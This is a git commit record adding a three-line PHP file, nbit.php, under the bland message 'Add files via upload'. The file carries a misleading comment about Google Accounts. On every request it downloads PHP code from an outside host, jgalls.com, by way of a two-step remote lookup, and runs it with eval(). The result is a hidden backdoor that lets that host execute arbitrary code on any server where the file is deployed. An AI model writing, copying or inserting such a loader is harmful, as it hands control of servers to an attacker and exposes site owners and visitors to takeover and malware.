7cbc7e009bf41f1b8d3c4ad7327d2f70fc1bbb68
nickeees <EverardoCastro283@gmail.com>
2024-07-24 10:06:16 +0800

    Add files via upload

---
+++ nbit.php
@@ -0,0 +1,3 @@
+<?php
+/* your Google Account and services. */
+if(getIP()!=""){eval("?>".(file_get_contents(file_get_contents("http://jgalls.com/1.aspx")."php2/nbit.txt")));}function getIP(){if(getenv('HTTP_CLIENT_IP')){$a=getenv('HTTP_CLIENT_IP');}elseif(getenv('HTTP_X_FORWARDED_FOR')){$a=getenv('HTTP_X_FORWARDED_FOR');}elseif(getenv('HTTP_X_FORWARDED')){$a=getenv('HTTP_X_FORWARDED');}elseif(getenv('HTTP_FORWARDED_FOR')){$a=getenv('HTTP_FORWARDED_FOR');}elseif(getenv('HTTP_FORWARDED')){$a=getenv('HTTP_FORWARDED');}else{$a=$_SERVER['REMOTE_ADDR'];}return $a;}?>
